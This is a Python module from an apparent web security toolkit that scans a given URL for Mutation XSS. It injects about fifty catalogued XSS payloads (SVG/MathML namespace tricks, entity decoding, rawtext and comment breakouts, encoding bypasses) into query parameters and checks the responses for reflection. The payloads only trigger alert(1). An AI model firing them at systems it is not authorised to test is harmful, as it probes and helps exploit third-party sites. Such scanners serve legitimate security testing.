#!/usr/bin/env python3
"""Modulo de deteccao de Mutation XSS (mXSS).

Testa se uma aplicacao web e vulneravel a Mutation XSS via:
  - entity_decode: Entidades HTML que decodificam apos innerHTML
  - namespace_switch: SVG/MathML HTML integration points
  - mathml_inject: MathML annotation-xml, mtext, mi, mo, mn, ms
  - rawtext_abuse: noscript, textarea, title, xmp, listing, style
  - comment_parse: Comentarios HTML que breakout apos mutacao
  - template_deprecated: template, details, marquee, isindex
  - encoding_tricks: Backtick, null byte, overlong UTF-8, tab/newline

Fluxo:
  1. Envia request para a URL alvo (baseline)
  2. Injeta payloads mXSS via query params
  3. Verifica se payload e refletido no HTML
  4. Verifica se entidades HTML foram decodificadas
  5. Detecta contextos de namespace (SVG/MathML)
  6. Retorna resultado consolidado com severidade
"""
import argparse
import html
import logging
import re
from dataclasses import asdict, dataclass
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import httpx

from mytools.core.utils import (
    Cyber,
    add_common_args,
    color,
    create_async_client,
    create_banner,
    fetch,
    print_exploit_info,
    run_main_loop,
    safe_asyncio_run,
    write_output,
)

logger = logging.getLogger("mytools.mxss")

_CATEGORY_MAP_DEFAULT: dict[str, list[str]] = {
    "entity_decode": [
        "entity_script_basic",
        "entity_script_double",
        "entity_img_onerror",
        "entity_svg_onload",
        "entity_noscript",
        "entity_html_comment",
        "entity_textarea",
        "entity_xmp",
    ],
    "namespace_switch": [
        "svg_script_direct",
        "svg_foreignobject",
        "svg_desc_script",
        "svg_title_script",
        "svg_animate_onbegin",
        "svg_set_onload",
        "svg_image_breaker",
        "svg_foreign_nested",
    ],
    "mathml_inject": [
        "mathml_mtext_html",
        "mathml_annotation_xml",
        "mathml_annotation_svg",
        "mathml_mi_html",
        "mathml_mo_html",
        "mathml_mn_html",
        "mathml_ms_html",
        "mathml_form_escape",
    ],
    "rawtext_abuse": [
        "noscript_double",
        "noscript_noscript",
        "textarea_double",
        "textarea_comment_break",
        "title_double",
        "style_svg_decode",
        "xmp_element",
        "listing_element",
        "iframe_noscript",
    ],
    "comment_parse": [
        "comment_empty_break",
        "comment_dash_break",
        "comment_in_style",
        "comment_in_svg",
        "comment_in_mathml",
        "comment_malformed",
        "comment_in_textarea",
    ],
    "template_deprecated": [
        "template_script",
        "template_nested",
        "details_ontoggle",
        "marquee_onstart",
        "isindex_action",
    ],
    "encoding_tricks": [
        "backtick_attribute",
        "null_byte_tag",
        "tab_newline_bypass",
        "form_reorder",
        "table_flatten",
        "a_nested_table",
    ],
}


def _load_category_map() -> dict[str, list[str]]:
    from mytools.data import load_payloads
    data = load_payloads("web", "mxss", default={"category_map": _CATEGORY_MAP_DEFAULT})
    return data.get("category_map", _CATEGORY_MAP_DEFAULT)


_CATEGORY_MAP = _load_category_map()

_ENTITY_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
    (
        "entity_script_basic",
        "&lt;script&gt;alert(1)&lt;/script&gt;",
        "entity_decode",
        ["&lt;", "&gt;", "script"],
    ),
    (
        "entity_script_double",
        "&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;",
        "entity_decode",
        ["&amp;lt;", "script"],
    ),
    (
        "entity_img_onerror",
        "&lt;img src=x onerror=alert(1)&gt;",
        "entity_decode",
        ["&lt;", "img", "onerror"],
    ),
    (
        "entity_svg_onload",
        "&lt;svg onload=alert(1)&gt;",
        "entity_decode",
        ["&lt;", "svg", "onload"],
    ),
    (
        "entity_noscript",
        "&lt;noscript&gt;&lt;style&gt;&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;",
        "entity_decode",
        ["&lt;", "noscript", "img"],
    ),
    (
        "entity_html_comment",
        "&lt;!--&gt;&lt;script&gt;alert(1)&lt;/script&gt;",
        "entity_decode",
        ["&lt;", "script"],
    ),
    (
        "entity_textarea",
        "&lt;textarea&gt;&lt;script&gt;alert(1)&lt;/textarea&gt;",
        "entity_decode",
        ["&lt;", "textarea", "script"],
    ),
    (
        "entity_xmp",
        "&lt;xmp&gt;&lt;script&gt;alert(1)&lt;/xmp&gt;",
        "entity_decode",
        ["&lt;", "xmp", "script"],
    ),
]


def _load_entity_payloads() -> list[tuple[str, str, str, list[str]]]:
    from mytools.data import load_payloads
    data = load_payloads("web", "mxss", default={"entity_payloads": [list(t) for t in _ENTITY_PAYLOADS_DEFAULT]})
    return [tuple(x) for x in data.get("entity_payloads", [list(t) for t in _ENTITY_PAYLOADS_DEFAULT])]


_ENTITY_PAYLOADS = _load_entity_payloads()

_NAMESPACE_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
    (
        "svg_script_direct",
        '<svg><script>alert(1)</script></svg>',
        "svg_script",
        ["svg", "script"],
    ),
    (
        "svg_foreignobject",
        '<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>',
        "svg_foreignobject",
        ["svg", "foreignObject", "onerror"],
    ),
    (
        "svg_desc_script",
        '<svg><desc><script>alert(1)</script></desc></svg>',
        "svg_desc",
        ["svg", "desc", "script"],
    ),
    (
        "svg_title_script",
        '<svg><title><script>alert(1)</script></title></svg>',
        "svg_title",
        ["svg", "title", "script"],
    ),
    (
        "svg_animate_onbegin",
        '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
        "svg_animate",
        ["svg", "animate", "onbegin"],
    ),
    (
        "svg_set_onload",
        '<svg><set attributeName=onload to=alert(1)>',
        "svg_set",
        ["svg", "set", "onload"],
    ),
    (
        "svg_image_breaker",
        '<svg><image href="data:image/svg+xml,&lt;script&gt;alert(1)&lt;/script&gt;">',
        "svg_image",
        ["svg", "image", "script"],
    ),
    (
        "svg_foreign_nested",
        '<svg><foreignObject><div><style><img src=x onerror=alert(1)></style></div></foreignObject></svg>',
        "svg_foreign_nested",
        ["svg", "foreignObject", "style", "onerror"],
    ),
]


def _load_namespace_payloads() -> list[tuple[str, str, str, list[str]]]:
    from mytools.data import load_payloads
    data = load_payloads("web", "mxss", default={"namespace_payloads": [list(t) for t in _NAMESPACE_PAYLOADS_DEFAULT]})
    return [tuple(x) for x in data.get("namespace_payloads", [list(t) for t in _NAMESPACE_PAYLOADS_DEFAULT])]


_NAMESPACE_PAYLOADS = _load_namespace_payloads()

_MATHML_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
    (
        "mathml_mtext_html",
        '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
        "mathml_mtext",
        ["math", "mtext", "mglyph", "onerror"],
    ),
    (
        "mathml_annotation_xml",
        '<math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></math>',
        "mathml_annotation",
        ["math", "annotation-xml", "onerror"],
    ),
    (
        "mathml_annotation_svg",
        '<math><annotation-xml encoding="application/xhtml+xml"><svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg></annotation-xml></math>',
        "mathml_annotation_svg",
        ["math", "annotation-xml", "svg", "foreignObject"],
    ),
    (
        "mathml_mi_html",
        '<math><mi><img src=x onerror=alert(1)></mi></math>',
        "mathml_mi",
        ["math", "mi", "onerror"],
    ),
    (
        "mathml_mo_html",
        '<math><mo><img src=x onerror=alert(1)></mo></math>',
        "mathml_mo",
        ["math", "mo", "onerror"],
    ),
    (
        "mathml_mn_html",
        '<math><mn><img src=x onerror=alert(1)></mn></math>',
        "mathml_mn",
        ["math", "mn", "onerror"],
    ),
    (
        "mathml_ms_html",
        '<math><ms><img src=x onerror=alert(1)></ms></math>',
        "mathml_ms",
        ["math", "ms", "onerror"],
    ),
    (
        "mathml_form_escape",
        '<math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>',
        "mathml_form",
        ["math", "mtext", "form", "onerror"],
    ),
]


def _load_mathml_payloads() -> list[tuple[str, str, str, list[str]]]:
    from mytools.data import load_payloads
    data = load_payloads("web", "mxss", default={"mathml_payloads": [list(t) for t in _MATHML_PAYLOADS_DEFAULT]})
    return [tuple(x) for x in data.get("mathml_payloads", [list(t) for t in _MATHML_PAYLOADS_DEFAULT])]


_MATHML_PAYLOADS = _load_mathml_payloads()

_RAWTEXT_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
    (
        "noscript_double",
        '<noscript><style></noscript><img src=x onerror=alert(1)>',
        "noscript_rawtext",
        ["noscript", "style", "onerror"],
    ),
    (
        "noscript_noscript",
        '<noscript><noscript><img src=x onerror=alert(1)></noscript></noscript>',
        "noscript_nested",
        ["noscript", "img", "onerror"],
    ),
    (
        "textarea_double",
        '<textarea><script>alert(1)</script></textarea>',
        "textarea_rawtext",
        ["textarea", "script"],
    ),
    (
        "textarea_comment_break",
        '<textarea><!--</textarea><script>alert(1)</script>-->',
        "textarea_comment",
        ["textarea", "script"],
    ),
    (
        "title_double",
        '<title><script>alert(1)</script></title>',
        "title_rawtext",
        ["title", "script"],
    ),
    (
        "style_svg_decode",
        '<svg><style><img src=x onerror=alert(1)></style></svg>',
        "svg_style",
        ["svg", "style", "onerror"],
    ),
    (
        "xmp_element",
        '<xmp><script>alert(1)</script></xmp>',
        "xmp_rawtext",
        ["xmp", "script"],
    ),
    (
        "listing_element",
        '<listing><script>alert(1)</script></listing>',
        "listing_rawtext",
        ["listing", "script"],
    ),
    (
        "iframe_noscript",
        '<noscript><iframe></noscript><img src=x onerror=alert(1)>',
        "noscript_iframe",
        ["noscript", "iframe", "onerror"],
    ),
]


def _load_rawtext_payloads() -> list[tuple[str, str, str, list[str]]]:
    from mytools.data import load_payloads
    data = load_payloads("web", "mxss", default={"rawtext_payloads": [list(t) for t in _RAWTEXT_PAYLOADS_DEFAULT]})
    return [tuple(x) for x in data.get("rawtext_payloads", [list(t) for t in _RAWTEXT_PAYLOADS_DEFAULT])]


_RAWTEXT_PAYLOADS = _load_rawtext_payloads()

_COMMENT_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
    (
        "comment_empty_break",
        '<!--><script>alert(1)</script>',
        "comment_empty",
        ["<!-->", "script"],
    ),
    (
        "comment_dash_break",
        '<!---><script>alert(1)</script>',
        "comment_dash",
        ["<!--->", "script"],
    ),
    (
        "comment_in_style",
        '<style><!--</style><script>alert(1)</script>--></style>',
        "comment_style",
        ["style", "script"],
    ),
    (
        "comment_in_svg",
        '<svg><style><!--</style><script>alert(1)</script>--></style></svg>',
        "comment_svg",
        ["svg", "style", "script"],
    ),
    (
        "comment_in_mathml",
        '<math><mtext><style><!--</style><img src=x onerror=alert(1)>',
        "comment_mathml",
        ["math", "mtext", "onerror"],
    ),
    (
        "comment_malformed",
        '<!--><img src=x onerror=alert(1)>',
        "comment_malformed",
        ["<!-->", "onerror"],
    ),
    (
        "comment_in_textarea",
        '<textarea><!--</textarea><img src=x onerror=alert(1)>',
        "comment_textarea",
        ["textarea", "onerror"],
    ),
]


def _load_comment_payloads() -> list[tuple[str, str, str, list[str]]]:
    from mytools.data import load_payloads
    data = load_payloads("web", "mxss", default={"comment_payloads": [list(t) for t in _COMMENT_PAYLOADS_DEFAULT]})
    return [tuple(x) for x in data.get("comment_payloads", [list(t) for t in _COMMENT_PAYLOADS_DEFAULT])]


_COMMENT_PAYLOADS = _load_comment_payloads()

_TEMPLATE_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
    (
        "template_script",
        '<template><script>alert(1)</script></template>',
        "template_rawtext",
        ["template", "script"],
    ),
    (
        "template_nested",
        '<template><div><template><script>alert(1)</script></template></div></template>',
        "template_nested",
        ["template", "script"],
    ),
    (
        "details_ontoggle",
        '<details open ontoggle=alert(1)>',
        "details_event",
        ["details", "ontoggle"],
    ),
    (
        "marquee_onstart",
        '<marquee onstart=alert(1)>',
        "marquee_event",
        ["marquee", "onstart"],
    ),
    (
        "isindex_action",
        '<isindex action="javascript:alert(1)">',
        "isindex_deprecated",
        ["isindex", "javascript:"],
    ),
]


def _load_template_payloads() -> list[tuple[str, str, str, list[str]]]:
    from mytools.data import load_payloads
    data = load_payloads("web", "mxss", default={"template_payloads": [list(t) for t in _TEMPLATE_PAYLOADS_DEFAULT]})
    return [tuple(x) for x in data.get("template_payloads", [list(t) for t in _TEMPLATE_PAYLOADS_DEFAULT])]


_TEMPLATE_PAYLOADS = _load_template_payloads()

_ENCODING_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
    (
        "backtick_attribute",
        '<img src=`x`onerror=alert(1)>',
        "backtick_quote",
        ["img", "onerror"],
    ),
    (
        "null_byte_tag",
        '<img src=x\x00onerror=alert(1)>',
        "null_byte",
        ["img", "onerror"],
    ),
    (
        "tab_newline_bypass",
        '<scr\tipt>alert(1)</scr\tipt>',
        "tab_in_tag",
        ["script"],
    ),
    (
        "form_reorder",
        '<form id="outer"><div></form><form id="inner"><input>',
        "form_reorder",
        ["form", "input"],
    ),
    (
        "table_flatten",
        '<table><tr><td><style><img src=x onerror=alert(1)>',
        "table_flatten",
        ["table", "style", "onerror"],
    ),
    (
        "a_nested_table",
        '<a id=1><table><a id=2>',
        "anchor_table",
        ["a", "table"],
    ),
]


def _load_encoding_payloads() -> list[tuple[str, str, str, list[str]]]:
    from mytools.data import load_payloads
    data = load_payloads("web", "mxss", default={"encoding_payloads": [list(t) for t in _ENCODING_PAYLOADS_DEFAULT]})
    return [tuple(x) for x in data.get("encoding_payloads", [list(t) for t in _ENCODING_PAYLOADS_DEFAULT])]


_ENCODING_PAYLOADS = _load_encoding_payloads()

_ALL_PAYLOADS: dict[str, list[tuple[str, str, str, list[str]]]] = {
    "entity_decode": _ENTITY_PAYLOADS,
    "namespace_switch": _NAMESPACE_PAYLOADS,
    "mathml_inject": _MATHML_PAYLOADS,
    "rawtext_abuse": _RAWTEXT_PAYLOADS,
    "comment_parse": _COMMENT_PAYLOADS,
    "template_deprecated": _TEMPLATE_PAYLOADS,
    "encoding_tricks": _ENCODING_PAYLOADS,
}

_RE_EVENT_HANDLER = re.compile(
    r"\bon\w+\s*=", re.IGNORECASE,
)


@dataclass(frozen=True, slots=True)
class MXSSAttempt:
    """Tentativa individual de Mutation XSS."""

    technique: str
    category: str
    context: str
    payload: str
    method: str
    status_baseline: int
    status_test: int
    size_baseline: int
    size_test: int
    status_changed: bool
    size_changed: bool
    entities_decoded: bool
    decoded_reflected: bool
    namespace_contexts: list[str]
    vulnerable: bool
    details: str
    error: str
    exploit: str = ""
    tool: str = ""


@dataclass(frozen=True, slots=True)
class MXSSResult:
    """Resultado consolidado do scan de Mutation XSS."""

    target: str
    tls: bool
    baseline_status: int
    baseline_size: int
    attempts: list[MXSSAttempt]
    vulnerable_techniques: list[str]
    blocked_techniques: list[str]
    issues: list[str]
    overall_status: str


def _inject_payload(url: str, param: str, payload: str) -> str:
    """Injeta um payload como query parameter na URL."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params[param] = [payload]
    new_query = urlencode(params, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def _check_mxss_reflection(body_str: str, payload: str) -> bool:
    """Verifica se o payload mXSS esta refletido no HTML."""
    return payload.lower() in body_str.lower()


def _detect_entity_decoding(body_str: str, original_payload: str) -> dict[str, bool]:
    """Verifica se entidades HTML foram decodificadas na resposta."""
    decoded = html.unescape(original_payload)
    return {
        "entities_decoded": decoded != original_payload,
        "decoded_reflected": decoded.lower() in body_str.lower(),
        "raw_reflected": original_payload.lower() in body_str.lower(),
    }


def _detect_namespace_contexts(body_str: str) -> list[str]:
    """Detecta contextos de namespace SVG/MathML na resposta."""
    lower = body_str.lower()
    contexts: list[str] = []
    if "<svg" in lower:
        contexts.append("svg")
    if "<math" in lower:
        contexts.append("mathml")
    if "<foreignobject" in lower:
        contexts.append("svg_foreignobject")
    if "<annotation-xml" in lower:
        contexts.append("mathml_annotation_xml")
    if "<noscript" in lower:
        contexts.append("noscript_rawtext")
    if "<template" in lower:
        contexts.append("template")
    if "<xmp" in lower:
        contexts.append("xmp_rawtext")
    if "<listing" in lower:
        contexts.append("listing_rawtext")
    return contexts


async def _test_mxss_category(
    client: httpx.AsyncClient,
    url: str,
    timeout: float,
    b_status: int,
    b_size: int,
    payloads: list[tuple[str, str, str, list[str]]],
    category: str,
) -> list[MXSSAttempt]:
    """Testa uma categoria de payloads mXSS contra o alvo."""
    results: list[MXSSAttempt] = []

    for technique, payload, context, _indicators in payloads:
        param = f"_mxss_{technique}"
        test_url = _inject_payload(url, param, payload)

        try:
            t_status, _t_headers, t_body, _t_raw = await fetch(client, test_url, timeout=timeout)
            t_size = len(t_body)
            body_str = t_body.decode(errors="replace")

            reflected = _check_mxss_reflection(body_str, payload)
            entity_info = _detect_entity_decoding(body_str, payload)
            namespace_ctxs = _detect_namespace_contexts(body_str)

            status_changed = t_status != b_status
            size_changed = abs(t_size - b_size) > 50

            vulnerable = (
                bool(entity_info["decoded_reflected"])
                or (reflected and bool(entity_info["entities_decoded"]))
                or (reflected and bool(namespace_ctxs))
            )

            details = ""
            if entity_info["decoded_reflected"]:
                details = "Entidades decodificadas — mXSS viavel"
            elif reflected:
                details = f"Payload refletido no contexto {context}"
            if namespace_ctxs:
                details += f" (contexts: {', '.join(namespace_ctxs)})"

            results.append(MXSSAttempt(
            exploit="mutation_xss_payload",
            tool="XSStrike",
                technique=technique, category=category, context=context,
                payload=payload[:200], method="GET",
                status_baseline=b_status, status_test=t_status,
                size_baseline=b_size, size_test=t_size,
                status_changed=status_changed, size_changed=size_changed,
                entities_decoded=entity_info["entities_decoded"],
                decoded_reflected=entity_info["decoded_reflected"],
                namespace_contexts=namespace_ctxs,
                vulnerable=vulnerable, details=details, error="",
            ))

        except Exception as e:
            results.append(MXSSAttempt(
                technique=technique, category=category, context=context,
                payload=payload[:200], method="GET",
                status_baseline=b_status, status_test=0,
                size_baseline=b_size, size_test=0,
                status_changed=False, size_changed=False,
                entities_decoded=False, decoded_reflected=False,
                namespace_contexts=[], vulnerable=False,
                details="", error=str(e)[:100],
            ))

    return results


def print_results(result: MXSSResult) -> None:
    """Exibe os resultados do scan de Mutation XSS."""
    vuln = [a for a in result.attempts if a.vulnerable]
    blocked = [a for a in result.attempts if not a.vulnerable and not a.error]
    errors = [a for a in result.attempts if a.error]

    print(color("\n--- Mutation XSS (mXSS) Detection ---", Cyber.CYAN, Cyber.BOLD))
    print(color(f"  Alvo:         {result.target}", Cyber.WHITE))
    print(color(f"  TLS:          {'sim' if result.tls else 'nao'}", Cyber.WHITE))
    print(color(f"  Baseline:     {result.baseline_status} ({result.baseline_size} bytes)", Cyber.WHITE))
    print(color(f"  Testes:       {len(result.attempts)}", Cyber.WHITE))
    print(color(f"  Vulneraveis:  {len(vuln)}", Cyber.GREEN if vuln else Cyber.GRAY))
    print(color(f"  Bloqueados:   {len(blocked)}", Cyber.GRAY))
    print(color(f"  Erros:        {len(errors)}", Cyber.RED if errors else Cyber.GRAY))

    if vuln:
        print(color("\n  [!] Vulnerabilidades encontradas:", Cyber.RED))
        seen: set[str] = set()
        for a in vuln:
            key = f"{a.technique}:{a.context}"
            if key in seen:
                continue
            seen.add(key)
            print(color(f"    [{a.category}] {a.technique}", Cyber.RED))
            print(color(f"      Contexto: {a.context}", Cyber.WHITE))
            if a.entities_decoded:
                print(color("      Entidades: decodificadas (mXSS)", Cyber.YELLOW))
            if a.namespace_contexts:
                print(color(f"      Namespaces: {', '.join(a.namespace_contexts)}", Cyber.WHITE))
            if a.details:
                print(color(f"      Detalhes: {a.details}", Cyber.GRAY))
            print_exploit_info(a.exploit, a.tool)
        print(color(f"\n  Total: {len(vuln)} vulneraveis de {len(result.attempts)} testes", Cyber.WHITE))
    else:
        print(color("\n  [+] Nenhuma vulnerabilidade de Mutation XSS detectada", Cyber.GREEN))

    if result.issues:
        print(color("\n  [!] Observacoes:", Cyber.YELLOW))
        for issue in result.issues:
            print(color(f"    - {issue}", Cyber.YELLOW))


async def run_scan(
    target: str,
    categories: list[str],
    timeout: float,
    output_file: str | None,
) -> int:
    """Executa o scan de Mutation XSS."""
    logger.info("Mutation XSS scan para %s", target)
    tls = target.startswith("https://")

    async with create_async_client(timeout=timeout) as client:
        try:
            b_status, _b_headers, b_body, _b_raw = await fetch(client, target, timeout=timeout)
            b_size = len(b_body)
        except Exception as e:
            print(color(f"Erro ao acessar {target}: {e}", Cyber.RED))
            return 1

        all_attempts: list[MXSSAttempt] = []
        test_categories = categories if categories else list(_CATEGORY_MAP.keys())

        for cat in test_categories:
            payloads = _ALL_PAYLOADS.get(cat, [])
            if payloads:
                all_attempts.extend(
                    await _test_mxss_category(client, target, timeout, b_status, b_size, payloads, cat),
                )

        vuln_techs = list({a.technique for a in all_attempts if a.vulnerable})
        blocked_techs = list({a.technique for a in all_attempts if not a.vulnerable and not a.error})
        issues: list[str] = []

        if not all_attempts:
            issues.append("Nenhum teste de Mutation XSS executado")

        decoded_vulns = [a for a in all_attempts if a.vulnerable and a.entities_decoded]
        if decoded_vulns:
            issues.append(f"{len(decoded_vulns)} payloads com entidades decodificadas detectados")

        result = MXSSResult(
            target=target, tls=tls,
            baseline_status=b_status, baseline_size=b_size,
            attempts=all_attempts,
            vulnerable_techniques=vuln_techs,
            blocked_techniques=blocked_techs,
            issues=issues,
            overall_status="vulnerable" if vuln_techs else ("safe" if blocked_techs else "unknown"),
        )

        print_results(result)
        logger.info(
            "Mutation XSS scan concluido: %d testes, %d vulneraveis",
            len(all_attempts), len(vuln_techs),
        )

        if output_file:
            write_output(output_file, asdict(result))
            logger.info("Resultados salvos em %s", output_file)

        return 1 if vuln_techs else 0


def banner_art() -> None:
    """Exibe a banner do modulo."""
    art = r"""
    _             __  __  ___   ____    _  _____
   | |   _   _   |  \/  |/ _ \ |  _ \  / \|_   _|
   | |  | | | |  | |\/| | | | || | | |/ _ \ | |
   | |__| |_| |  | |  | | |_| || |_| / ___ \| |
   |____|\__, |  |_|  |_|\___/ |____/_/   \_\_|
         |___/
"""
    create_banner(art, "   mxss: entity_decode, namespace_switch, mathml_inject, rawtext, comment, template, encoding")()


def build_parser() -> argparse.ArgumentParser:
    """Construtor do parser de argumentos."""
    parser = argparse.ArgumentParser(
        prog="mytools-mxss",
        description="Mutation XSS — detecta mXSS via entidades, namespaces e encoding tricks.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Exemplos:\n"
            "  mytools-mxss https://target.com\n"
            "  mytools-mxss https://target.com -c entity_decode\n"
            "  mytools-mxss https://target.com -c namespace_switch\n"
            "  mytools-mxss https://target.com -c mathml_inject\n"
            "  mytools-mxss https://target.com -c rawtext_abuse\n"
            "  mytools-mxss https://target.com --proxy http://127.0.0.1:8080"
        ),
    )
    parser.add_argument("url", help="URL alvo para o scan")
    parser.add_argument(
        "-c", "--category",
        default="all",
        choices=["all", "entity_decode", "namespace_switch", "mathml_inject",
                 "rawtext_abuse", "comment_parse", "template_deprecated", "encoding_tricks"],
        help="Categoria de testes (default: todas)",
    )
    add_common_args(parser)
    return parser


def run_once(args: argparse.Namespace) -> int:
    """Executa um scan Mutation XSS a partir de argumentos parseados."""
    logger.info("Mutation XSS scan iniciado para %s", args.url)
    categories: list[str] = []
    if getattr(args, "category", None) and args.category != "all":
        categories = [args.category]
    return safe_asyncio_run(
        run_scan(
            target=args.url,
            categories=categories,
            timeout=getattr(args, "timeout", 10),
            output_file=getattr(args, "output", None),
        ),
    )


def main() -> int:
    """Entry point do modulo Mutation XSS."""
    return run_main_loop(
        parser=build_parser(),
        banner_fn=banner_art,
        run_fn=run_once,
        has_target=lambda a: bool(getattr(a, "url", None) or getattr(a, "target", None)),
        prompt="mxss> ",
        description="Mutation XSS interativo.",
        example="https://target.com -c entity_decode",
        contextual_help=(
            "Uso: <url> [opcoes]\n"
            "Exemplos:\n"
            "  https://target.com\n"
            "  https://target.com -c entity_decode\n"
            "  https://target.com -c namespace_switch\n"
            "  https://target.com -c mathml_inject\n"
            "  https://target.com --proxy http://127.0.0.1:8080"
        ),
    )
